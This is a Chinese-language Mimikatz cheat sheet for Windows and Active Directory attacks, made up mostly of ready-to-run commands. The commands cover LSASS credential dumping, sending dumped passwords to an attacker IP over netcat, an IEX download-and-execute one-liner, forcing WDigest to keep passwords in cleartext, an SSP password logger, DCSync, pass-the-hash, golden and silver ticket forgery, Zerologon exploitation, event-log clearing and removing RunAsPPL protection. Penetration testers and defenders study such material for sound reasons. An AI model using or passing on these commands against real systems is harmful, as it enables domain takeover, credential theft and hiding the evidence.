# Mimikatz

<p align="center">
    <img src="../../../assets/img/logo/mimikatz.jpg" width="25%">
</p>

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

**项目地址**
- https://github.com/gentilkiwi/mimikatz

**文章 & Reference**
- [九种姿势运行 Mimikatz](https://www.freebuf.com/articles/web/176796.html)
- [Mimikatz 使用小技巧](https://www.webshell.cc/5343.html)
- [域渗透——Dump Clear-Text Password after KB2871997 installed](https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Dump%20Clear-Text%20Password%20after%20KB2871997%20installed.html)
- [【红蓝对抗】内网渗透-免杀抓取windows hash](https://mp.weixin.qq.com/s/WLP1soWz-_BEouMxTHLbzg)
- [Mimikatz的18种免杀姿势及防御策略(上)](https://mp.weixin.qq.com/s/CiOaMnJBcEQfZXV_hopzLw)
- [Mimikatz的18种免杀姿势及防御策略(下)](https://mp.weixin.qq.com/s/0p88rj-tWClLa_geKMkPgw)
- [防御Mimikatz攻击的方法介绍](https://www.freebuf.com/articles/network/180869.html)
- [获取Windows高版本明文密码](https://mp.weixin.qq.com/s/Q-JBDdt6jPi9fawlGAiHzg)
- [红队技巧：绕过ESET_NOD32抓取密码](https://mp.weixin.qq.com/s/FaiNEUX2wcscotkyAqUO2Q)
- [Exploring Mimikatz - Part 1 - WDigest](https://blog.xpnsec.com/exploring-mimikatz-part-1/)
    - [Mimikatz中sekurlsa::wdigest的实现](https://3gstudent.github.io/3gstudent.github.io/Mimikatz%E4%B8%ADsekurlsa-wdigest%E7%9A%84%E5%AE%9E%E7%8E%B0/)
- [Exploring Mimikatz - Part 2 - SSP](https://blog.xpnsec.com/exploring-mimikatz-part-2/)
    - [深入分析Mimikatz：SSP](https://www.anquanke.com/post/id/180001)
- [《MiniDumpWriteDump via COM+ Services DLL》的利用测试](https://3gstudent.github.io/3gstudent.github.io/MiniDumpWriteDump-via-COM+-Services-DLL-%E7%9A%84%E5%88%A9%E7%94%A8%E6%B5%8B%E8%AF%95/)
- [Extract credentials from lsass remotely](https://en.hackndo.com/remote-lsass-dump-passwords/)
- [缓解Mimikatz风格攻击](https://xz.aliyun.com/t/4180)
- [你真的了解LSA Protection (RunAsPPL)吗？](https://mp.weixin.qq.com/s/7DmfWMHjLXTfCHdoOWQ5qA)
- [从svchost.exe转储RDP在线用户的明文密码](https://mp.weixin.qq.com/s/8UU-w6J7JaNLn7lE1mTHZA)
- [读取lsass.dmp报错](http://hone.cool/2018/05/23/%E8%AF%BB%E5%8F%96lsass-dmp%E6%96%87%E4%BB%B6%E6%8A%A5%E9%94%99/)

**辅助项目**
- [skelsec/pypykatz](https://github.com/skelsec/pypykatz) - 纯 Python 的 Mimikatz 实现,Runs on all OS's which support python>=3.6
    ```
    pypykatz lsa minidump lsass.dmp
    ```
- [3gstudent/msbuild-inline-task](https://github.com/3gstudent/msbuild-inline-task) - 利用 MSBuild 执行 Mimikatz
    ```
    cd C:\Windows\Microsoft.NET\Framework64\v4.0.30319
    .\MSBuild.exe 1.xml
    ```
- [Stealthbits/poshkatz](https://github.com/Stealthbits/poshkatz) - PowerShell module for Mimikatz
- [vyrus001/go-mimikatz](https://github.com/vyrus001/go-mimikatz)
- JScript
    - [Instructions-to-mimikatz-js.txt](https://gist.github.com/pljoel/42dae5e56a86a43612bea6961cb59d1a) - JS 加载 Mimikatz
        ```
        cscript mimikatz.js
        ```
    - [xsl版](https://github.com/TideSec/BypassAntiVirus/blob/master/tools/mimikatz/mimikatz.xsl)
        ```
        wmic os get /format:"mimikatz.xsl"
        wmic os get /FORMAT:"https://example.com/mimikatz.xsl"
        ```
    - [sct版](https://github.com/TideSec/BypassAntiVirus/blob/master/tools/mimikatz/mimikatz.sct)
- html
    - [Hacking the World with HTML](https://osandamalith.com/2020/07/19/hacking-the-world-with-html/)
    - [OsandaMalith/PE2HTML](https://github.com/OsandaMalith/PE2HTML)
- [Hackndo/lsassy](https://github.com/Hackndo/lsassy)

---

## 基本使用

提权
```bash
privilege::debug    # 获取调试权限
```

抓取密码
```bash
sekurlsa::logonpasswords
```

如果你没有访问 lsass 进程的权限，那你就抓不到密码, 报错如下
```
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
```

输出
```bash
mimikatz.exe ""privilege::debug"" ""log sekurlsa::logonpasswords full"" exit && dir
# 记录 Mimikatz 输出
mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit >> log.txt
# 输出到 log.txt
```

**parameter -patch**
```
privilege::debug
lsadump::lsa /patch
```

**Token Elevation**

获得 MachineAccount 口令 hash
```
privilege::debug
token::elevate
lsadump::secrets
```

输出
```bash
mimikatz.exe ""privilege::debug"" ""token::elevate"" ""lsadump::secrets"" exit >> log.txt
```

**MSCACHE**
```
privilege::debug
lsadump::cache
```

**rdp**
```
privilege::debug
vault::cred /patch
```

---

## 离线抓取 (lsass dump)

**相关文章**
- [Win10及2012系统以后的明文抓取方式](https://www.anquanke.com/post/id/175364)
- [Mimikatz明文密码抓取](https://uknowsec.cn/posts/notes/Mimikatz%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96.html)
- [mimikatz-抓取windows明文密码](http://rtshield.top/2019/09/02/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7-mimikatz-%E6%8A%93%E5%8F%96windows%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81/)
- [利用Mimikatz提取虚拟机内存中的密码](https://www.freebuf.com/articles/system/44620.html)
- [LSASS Memory Dumps are Stealthier than Ever Before](https://www.deepinstinct.com/2021/01/24/lsass-memory-dumps-are-stealthier-than-ever-before/)
- [Lsass Memory Dumps are Stealthier than Ever Before - Part 2](https://www.deepinstinct.com/2021/02/16/lsass-memory-dumps-are-stealthier-than-ever-before-part-2/)
- [渗透技巧——使用Mimilib从dump文件中导出口令](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BD%BF%E7%94%A8Mimilib%E4%BB%8Edump%E6%96%87%E4%BB%B6%E4%B8%AD%E5%AF%BC%E5%87%BA%E5%8F%A3%E4%BB%A4/)
- [Mimikatz Against Virtual Machine Memory Part 1 Carnal0wnage](https://blog.carnal0wnage.com/2014/05/mimikatz-against-virtual-machine-memory.html)
- [Mimikatz Against Virtual Machine Memory Part 2 Carnal0wnage](https://blog.carnal0wnage.com/2014/06/mimikatz-against-virtual-machine-memory.html)

**[SharpDump](https://github.com/GhostPack/SharpDump)** c# 免杀抓明文

在管理员权限下运行生成 debug480.bin

特别注意,dump 的文件默认是 bin 后缀,拖到本地机器以后,需要自行把 bin 重命名为 zip 的后缀,然后正常解压出里面的文件,再丢给 mimikatz 去读取即可,如下

mimikatz 加载 dump 文件
```bash
sekurlsa::minidump debug480
sekurlsa::logonPasswords full
```

还有一些工具
- SqlDumper
    ```bash
    tasklist /svc | findstr lsass.exe  # 查看lsass.exe 的PID号
    # 或powershell 下
    Get-Process lsass

    Sqldumper.exe ProcessID 0 0x01100  # 导出mdmp文件
    ```

**WerFault.exe**

- [deepinstinct/LsassSilentProcessExit](https://github.com/deepinstinct/LsassSilentProcessExit)

**远程传输**

输出传输到远程机器
```bash
# Attacker 执行
nc -lvp 4444

# Victim 执行
mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit | nc.exe -vv 192.168.1.1 4444
# 192.168.1.1 为Attacker IP
```

通过 nc 远程执行
```bash
# Victim 执行
nc -lvp 443

# Attacker 执行
nc.exe -vv 192.168.1.2 443 -e mimikatz.exe
# 192.168.1.2 为 Victim IP
```

### 直接转储(Task Manager)

在任务管理器找到 lsass.exe，右键创建转储文件

### ProcDump

procdump 是微软的官方工具，不会被杀，所以如果你的 mimikatz 不免杀，可以用 procdump 导出 lsass.dmp 后拖回本地抓取密码来规避杀软。
```bash
Procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

也可以采用 pid 方式规避杀软
```
tasklist /fi "imagename eq lsass.exe"
procdump -accepteula -ma 640 lsass.dmp
```

然后用 mimikatz 加载导出来的内存再抓 hash
```
sekurlsa::minidump c:\users\test\appdata\local\temp\lsass.dmp
sekurlsa::logonpasswords full
```

### ComSvcs.dll

使用 `C:\windows\system32\comsvcs.dll` 的导出函数 MiniDump 能够 dump 指定进程的内存文件

在 dump 指定进程内存文件时，需要开启 SeDebugPrivilege 权限, 管理员权限的 cmd 下，默认支持 SeDebugPrivilege 权限，但是状态为 Disabled

直接在 cmd 下执行 rundll32 的命令尝试 dump 指定进程内存文件时，由于无法开启 SeDebugPrivilege 权限，所以会失败, 管理员权限的 powershell 下，默认支持 SeDebugPrivilege 权限，并且状态为 Enabled

所以可以通过 powershell 执行 rundll32 的命令实现

```powershell
Get-Process lsass
powershell -c "rundll32 C:\windows\system32\comsvcs.dll, MiniDump 516 C:\lsass.dmp full"
```

### windbg 中载入 mimilib 模块

可通过 notmyfault 强制蓝屏
- https://docs.microsoft.com/en-us/sysinternals/downloads/notmyfault
    ```
    notmyfault64.exe -accepteula /crash
    ````

    ![](../../../assets/img/Security/安全工具/mimikatz/16.png)

也可以使用 Bin2Dmp 将 vmem 文件转为 dmp 文件
```
Bin2Dmp.exe "Windows Server 2008 x64.vmem" win2k8.dmp
```

在 windbg 中载入 dmp 文件

![](../../../assets/img/Security/安全工具/mimikatz/5.png)

![](../../../assets/img/Security/安全工具/mimikatz/6.png)

运行 `.symfix` ，然后执行 `.reload`

![](../../../assets/img/Security/安全工具/mimikatz/7.png)

运行 `.load D:\xxx\mimilib.dll` windbg 中载入 mimilib 模块

![](../../../assets/img/Security/安全工具/mimikatz/8.png)

`!process 0 0 lsass.exe` 查找 lsass 进程

![](../../../assets/img/Security/安全工具/mimikatz/9.png)

`.process /r /p` 将镜像 lsass 环境转换到本机中

![](../../../assets/img/Security/安全工具/mimikatz/10.png)

`!mimikatz` 载入 mimikatz

![](../../../assets/img/Security/安全工具/mimikatz/11.png)

### LSASS Shtinkering

- https://github.com/deepinstinct/Lsass-Shtinkering

---

## 无法抓取 windows 明文密码的解决方法

### 换个操作系统

破解 lsass.dmp 文件是需要系统内核版本

比如在 win03 系统上获取到 lsass.dmp 文件要在 win03 下运行 mimikatz 破解

### 改注册表

在 KB2871997 之前， Mimikatz 可以直接抓取明文密码。

微软在 win7 之后就打了补丁 kb2871997，当服务器安装 KB2871997 补丁后，系统默认禁用 Wdigest Auth ，内存（lsass 进程）不再保存明文口令。Mimikatz 将读不到密码明文。

但由于一些系统服务需要用到 Wdigest Auth，所以该选项是可以手动开启的。（开启后，需要用户重新登录才能生效）

以下是支持的系统:
- Windows 7
- Windows 8
- Windows 8.1
- Windows Server 2008
- Windows Server 2012
- Windows Server 2012R 2

**开启 Wdigest Auth**
- cmd
    ```bash
    reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
    ```

- powershell
    ```bash
    Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1
    ```

- meterpreter
    ```bash
    reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogon
    ```

**关闭 Wdigest Auth**

- cmd
    ```bash
    reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
    ```

- powershell
    ```bash
    Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0
    ```

- meterpreter
    ```bash
    reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCreden
    ```

**让管理员重新登录**

在开启 Wdigest Auth 后，需要管理员重新登录才能抓明文密码。

强制锁屏

- cmd
    ```bash
    rundll32 user32.dll,LockWorkStation
    ```

- powershell
    ```powershell
    Function Lock-WorkStation
    {
    $signature = @"
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool LockWorkStation();
    "@
    $LockWorkStation = Add-Type -memberDefinition $signature -name "Win32LockWorkStation" -namespace Win32Functions -passthru
    $LockWorkStation::LockWorkStation() | Out-Null
    }
    Lock-WorkStation
    ```
    ```powershell
    powershell -c "IEX (New-Object Net.WebClient).DownloadString('https://x.x.x.x/Lock-WorkStation.ps1');"
    ```

    重新读取，可读到明文密码。

### ssp

mimikatz 包含的 SSP 提供自动记录本地验证凭证的功能。这包括计算机账户密码、运行服务凭证和任何登录的账户。默认情况下，这些数据会被记录在与 dll 文件相同的位置上，但也可以在系统的其他地方记录这些数据。如果 Windows 系统是一个提供认证用户访问权限的域控制器，那么备用的日志位置可以在 SYSVOL 中。

```bash
privilege::debug
misc::memssp
```
记录的结果在 `c:/windows/system32/mimilsa.log`

### dll

在 mimikatz 中有 32 和 64 两个版本，安装包里分别都带有不同位数的 mimilib.dll, 将对应版本的 dll 文件复制到 c:\windows\system32 下

将注册表中 Security Packages 的值设置为 mimilib.dll
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v "Security Packages" /t REG_MULTI_SZ /d mimilib.dll /f
```

等待系统重启后，在 c:\windows\system32 生成文件 kiwissp.log，记录当前用户的明文口令

---

## NTDS.DIT

使用 Mimikatz 提取 Active Directory hash
```bash
privilege::debug
mimikatz lsadump::lsa /inject exit
sekurlsa::minidump c:\temp\lsass.dmp      使用 Mimikatz 转储 LSASS 内存
sekurlsa::logonpasswords
```

### DCSync

Mimikatz 有一个功能（dcsync），利用目录复制服务（DRS）从 NTDS.DIT 文件中检索密码哈希值。

DCSync 是 mimikatz 在 2015 年添加的一个功能，由 Benjamin DELPY gentilkiwi 和 Vincent LE TOUX 共同编写，能够用来导出域内所有用户的 hash

利用 DRS(Directory Replication Service) 协议通过 IDL_DRSGetNCChanges 从域控制器复制用户凭据

该技术消除了直接从域控制器进行认证的必要性，因为它可以从域管理员环境中属于域的任意系统执行。

运行 DCSync 需要特殊权限。管理员，域管理员或企业管理员以及域控制器计算机帐户的任何成员都能够运行 DCSync 来提取密码数据。请注意，只读域控制器不仅可以默认为用户提取密码数据。
```bash
privilege::debug
lsadump::dcsync /domain:ffffffff0x.com /all /csv
```

通过使用 /user 参数指定域用户名，Mimikatz 会将该指定用户的所有帐户信息转储包括哈希值。
```bash
lsadump::dcsync /domain:ffffffff0x.com /user:krbtgt
lsadump::dcsync /domain:ffffffff0x.com /user:test
```

可以直接在域控制器中执行 Mimikatz，通过 lsass.exe 进程 dump 密码哈希
```bash
privilege::debug
lsadump::lsa /inject
```

**特权用户下**
```
runas /noprofile /user:test@ffffffff0x.com cmd
mimikatz.exe privilege::debug "lsadump::dcsync /domain:ffffffff0x.com /all /csv" exit
```

---

## PTH

在对 Windows 系统进行渗透测试过程中，如果获取目标机器的系统权限，则可以通过 hashdump 的方式获取目标机器历史登录信息，包括用户名和用户明文密码或者用户 hash，如果无法直接获取目标用户明文密码，则可以通过 pth 的方式远程登录目标机器

**相关文章**
- [mimikatz-pth with rdp](http://rtshield.top/2019/08/31/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7-mimikatz-pth_with_rdp/)
- https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth
- [Passing the hash with native RDP client (mstsc.exe)](https://edermi.github.io/post/2018/native_rdp_pass_the_hash/)
- [攻击3389之PTH](https://mp.weixin.qq.com/s/mVSc5geSYwncpOda1OT-0g)

**mimikatz 进行 PtH**

1. (工作组)通过 pth 进行远程登录(cmd)
    ```bash
    mimikatz.exe privilege::debug

    mimikatz.exe privilege::debug "sekurlsa::pth /user:用户名  /domain:目标机器IP  /ntlm:密码哈希"

    mimikatz.exe privilege::debug "sekurlsa::pth /user:win10 /domain:192.168.1.1 /ntlm:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"

    net use \\192.168.1.1\c$
    dir \\192.168.1.1\c$
    ```

2. (域)通过 pth 进行远程登录(cmd)
    ```bash
    mimikatz.exe privilege::debug
    mimikatz.exe sekurlsa::logonpasswords

    mimikatz.exe privilege::debug "sekurlsa::pth /domain:目标机器的域 /user:目标机器的用户名 /ntlm:用户名对应的hash"

    mimikatz.exe privilege::debug "sekurlsa::pth /user:win10 /domain:test.com /ntlm:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
    ```

3. 通过 pth 进行远程登录(mstsc)
    ```bash
    # 管理员权限下执行以下命令:
    mimikatz.exe privilege::debug "sekurlsa::pth /domain:目标机器的域 /user:目标机器的用户名 /ntlm:用户名对应的hash /run:mstsc.exe /restrictedadmin"
    ```

    RDP 限制管理模式是建立在 Kerberos 基础上的。看一下网络流量，可以看到 RDP 客户端代表模拟的用户请求 ticket，这没有问题，因为我们只需要通过哈希来验证 Kerberos。

**受限管理模式**

通过 pth 的方式远程登录有一个限制：受限管理模式(Restricted Admin mode)
- Windows8.1 和 Windows Server 2012(R2)默认支持该功能
- Win7 和 Windows Server 2008(R2)默认不支持该功能，需要安装补丁 KB2871997 和 KB2973351

1. 安装补丁 KB3126593,其原理与下述的修改注册表的原理是一致的
    - https://support.microsoft.com/en-us/help/2973351/microsoft-security-advisory-registry-update-to-improve-credentials-pro

2. 修改注册表
    ```bash
    HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa

    # 新建 DWORD 键值 DisableRestrictedAdmin，值为 0，代表开启;值为 1，代表关闭
    REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
    ```

    在获取目标系统权限之后，通过 cmd 交互，可以轻松关闭受限管理模式

3. mimikatz 修改注册表

    如果你有一个用户的 NTLM 哈希值，而这个用户有设置注册表的权限，你可以使用 Powershell 来启用它，然后通过 RDP 登录。
    ```bash
    mimikatz.exe privilege::debug "sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:powershell.exe"
    ```
    ```bash
    Enter-PSSession -Computer <Target>
    New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0"
    ```

4. 使用攻击机自己的用户及 Hash 进行远程登录
    ```bash
    mstsc.exe /restrictedadmin
    ```
    如果当前系统支持受限管理模式，则上述命令执行后会直接弹出远程登录的登录界面；如果当前系统不支持受限管理模式，则上述命令执行后会弹出远程桌面的参数说明

    如果上述命令顺利执行，输入目标机器的 IP 和端口，可直接进行远程登录，不需要输入任何口令，这种方式会使用当前攻击机的用户名和用户 hash 尝试登录目标机器

    开启 Restricted Admin mode
    ```bash
    REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
    ```

---

## PTT

### Silver_Tickets

导出 Server Hash
```bash
mimikatz.exe "privilege::debug” "sekurlsa::logonpasswords" "exit" > log.txt
```

使用 mimikatz 伪造白银票据：
```bash
mimikatz.exe "kerberos::golden /domain:<域名> /sid:<域 SID> /target:<目标服务器主机名> /service:<服务类型> /rc4:<NTLM Hash> /user:<用户名> /ptt" exit
```

**例子:访问域控上的 cifs 服务(Windoiws 主机间的文件共享)**

在域控上执行以下命令获取本地账户 NTLM Hash 和 SID

```bash
mimikatz.exe "privilege::debug” "sekurlsa::logonpasswords" "exit" > log.txt
```

![](../../../assets/img/Security/安全工具/mimikatz/1.png)

然后将生成白银票据注入到内存中,并查看票据生成情况。查看目标的文件共享服务成功：
```bash
kerberos::golden /domain:ffffffff0x.com /sid:S-1-5-21-1112871890-2494343973-3486175548 /target:WIN-A5GPDCPJ7OT.ffffffff0x.com /rc4:f9ca454a3544172034a8666a79eda95e /service:cifs /user:test /ptt

# 这里的 cifs 是指的文件共享服务，有了 cifs 服务权限，就可以访问域控制器的文件系统
```

访问测试

![](../../../assets/img/Security/安全工具/mimikatz/2.png)

**例子:DCSync**

有 LDAP 特权情况下，可以实现 DCSync

```bash
mimikatz "kerberos::golden /domain:<域名> /sid:<域 SID> /target:<目标服务器主机名> /service:LDAP /rc4:<NTLM Hash> /user:krbtgt /ptt" "lsadump::dcsync /domain:test.com /all /csv" exit
```
- 只能在域内计算机上运行，不支持域外
- /sid 表示域的 sid, 任一域用户的 sid 去除最后一位就是域的 sid
- /rc4 表示计算机帐户的 NTLM hash
- /user:krbtgt 表示伪造成用户 krbtgt，生成票据

```
mimikatz "kerberos::golden /domain:ffffffff0x.com /sid:S-1-5-21-1112871890-2494343973-3486175548 /target:WIN-A5GPDCPJ7OT.ffffffff0x.com /service:LDAP /rc4:b0924e2e9d84ba0679c59f3730e91400 /user:krbtgt /ptt" "lsadump::dcsync /domain:ffffffff0x.com /all /csv" exit
```

---

### Golden_Tickets

在 AS_REQ & AS_REP 中，用户使用自身 hash 加密时间戳发送给 KDC，KDC 验证成功后返回用 krbtgt hash 加密的 TGT 票据。如果攻击者有 krbtgt 的 hash，就可以自己给自己签发任意用户的 tgt 票据。

先导出 krbtgt 的 hash
```bash
privilege::debug
lsadump::lsa /patch

# 或

lsadump::dcsync /domain:<域名> /user:krbtgt
```

使用 mimikatz 伪造的黄金票据，这里生成 Golden Ticket 不仅可以使用 aes256，也可用 krbtgt 的 NTLM hash
```bash
kerberos::golden /user:<用户名> /domain:<域名> /sid:<域SID> /krbtgt:<Hash> /ticket:test.kiribi
```

利用 mimikatz 的 kerberos::ptt 将黄金票据 test.kiribi 注入到内存中：
```bash
# 清除缓存的票据
kerberos::purge

# 注入黄金票据 test.kiribi
kerberos::ptt test.kiribi

# 列出票据
kerberos::list
```

> 导入的票据在20分钟内有效，过期之后再次导入就行

现在可以访问域控共享目录，还能在 DC 上远程执行 psexec

但是需要注意的是用 psexec 远程执行命令的时候，需要不能使用 IP 访问。使用 NetBios 的服务名访问才会走 Kerberos 认证，达到伪造凭据的攻击

**例子**

在数据库服务器上，利用域管理员的权限获得 krbtgt 的 NTLM 哈希 和 SID

使用 Mimikatz 抓取 Krbtgt 账号的密码
```bash
mimikatz.exe "lsadump::dcsync /domain:ffffffff0x.com /user:krbtgt" > log.txt
```

![](../../../assets/img/Security/安全工具/mimikatz/3.png)

得到 krbtgt 哈希之后，使用 mimikatz 的 `kerberos::golden` 生成黄金票据 `test.kiribi`：
```bash
kerberos::golden /user:administrator /domain:FFFFFFFF0X.com /sid:S-1-5-21-1112871890-2494343973-3486175548 /krbtgt:743093920acd8d427323c24c0e2c52c2 /ticket:test.kiribi
```
`/admin` 为伪造的用户名，用户名可以任意伪造 `/domain` 为目标的域名 `/sid` 为目标域名的 SID `/krbtgt` 为 krbtgt 账户密码的 NTLM Hash `/ticket` 为要伪造的黄金票据的名称

注入黄金票据
```bash
kerberos::ptt test.kiribi
```

访问测试

![](../../../assets/img/Security/安全工具/mimikatz/4.png)

---

## PTK

```bash
# 获取用户的 aes key
mimikatz "privilege::debug" "sekurlsa::ekeys"

# 注意查看 aes256_hmac 和 aes128_hmac

mimikatz "privilege::debug" "sekurlsa::pth /user:test /domain:test.com /aes256:c4388a1fb9bd65a88343a32c09e53ba6c1ead4de8a17a442e819e98c522fc288"
```

域控未打 KB2871997 补丁前，无法使用 Key 传递攻击

---

## zerologon

```bash
# 检测
lsadump::zerologon /target:WIN-A5GPDCPJ7OT.ffffffff0x.com /account:WIN-A5GPDCPJ7OT$

# 利用
lsadump::zerologon /target:WIN-A5GPDCPJ7OT.ffffffff0x.com /account:WIN-A5GPDCPJ7OT$ /exploit

# 使用空密码登录域管
lsadump::dcsync /domain:ffffffff0x.com /dc:WIN-A5GPDCPJ7OT.ffffffff0x.com /user:krbtgt /authuser:WIN-A5GPDCPJ7OT$ /authdomain:ffffffff0x /authpassword:"" /authntlm

# 导出hash
lsadump::dcsync /domain:ffffffff0x.com /dc:WIN-A5GPDCPJ7OT.ffffffff0x.com /user:administrator /authuser:WIN-A5GPDCPJ7OT$ /authdomain:ffffffff0x /authpassword: /authntlm

# 恢复密码
lsadump::postzerologon /target:192.168.141.154 /account:WIN-A5GPDCPJ7OT$
```

---

## 后渗透

多用户登录 3389
```
ts::multirdp
```

清除日志
```
event::drop
```

粘贴板信息
```
misc::clip
```

---

## 绕过RunAsPPL

RunAsPPL 有效地阻止了 Mimikatz 访问的内存 lsass.exe

为此，Mimikatz 使用数字签名的驱动程序来删除内核中 Process 对象的保护标志。该文件 mimidrv.sys 必须位于当前文件夹中，以便使用命令作为内核驱动程序服务加载!+。然后，您可以使用命令! processprotect 删除保护并最终访问 lsass.exe。
```
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

完成后，您甚至可以使用相同的命令 “恢复” 保护，而无需使用 / remove 参数，最后使用!- 卸载驱动程序。
```
mimikatz # !processprotect /process:lsass.exe
mimikatz # !-
```

---

## DPAPI

查看目标Windows凭据管理器中是否保存有各种系统连接账密
```
cmdkey /l
```

通过读取 Lsass 进程信息，获取当前系统中的 MasterKey，能获得多个 Master Key file 对应的 MasterKey
```
privilege::debug
sekurlsa::dpapi
```

**RDP**

Windows 保存 RDP 凭据的目录是 `C:\Users\用户名\AppData\Local\Microsoft\Credentials`

![](../../../assets/img/Security/安全工具/mimikatz/12.png)

可通过命令行获取，执行: `cmdkey /list` 或 `powerpick Get-ChildItem C:\Users\用户名\AppData\Local\Microsoft\Credentials\ -Force`

注意: `cmdkey /list` 命令务必在 Session 会话下执行，system 下执行无结果。

mimikatz 获取 guidMasterKey,再通过 guid 来找到其所对应的 Masterkey
```
privilege::debug
dpapi::cred /in:C:\Users\USERNAME\AppData\Local\Microsoft\Credentials\SESSIONID
```

![](../../../assets/img/Security/安全工具/mimikatz/13.png)

pbData 是我们要解密的数据，guidMasterKey 是解密所需要的密钥,找到对应的 Masterkey 才能解密

根据上面的 guidMasterKey 来确定其对应的 MasterKey, 如下所示
```
sekurlsa::dpapi
```

![](../../../assets/img/Security/安全工具/mimikatz/14.png)

```
dpapi::cred /in:C:\Users\USERNAME\Desktop\test\SESSIONID /masterkey:对应GUID的masterkey"
```

![](../../../assets/img/Security/安全工具/mimikatz/15.png)

---

## MSTSC Passwords

从 Svchost.exe Dump RDP 明文密码
```bash
privilege::debug
ts::mstsc
```

在 RDP 连接目标时才能抓出来

![](../../../assets/img/Security/安全工具/mimikatz/17.png)

---

## 防御手段

- [Secure-Win](../../Integrated/Windows/Secure-Win.md#防御密码抓取)
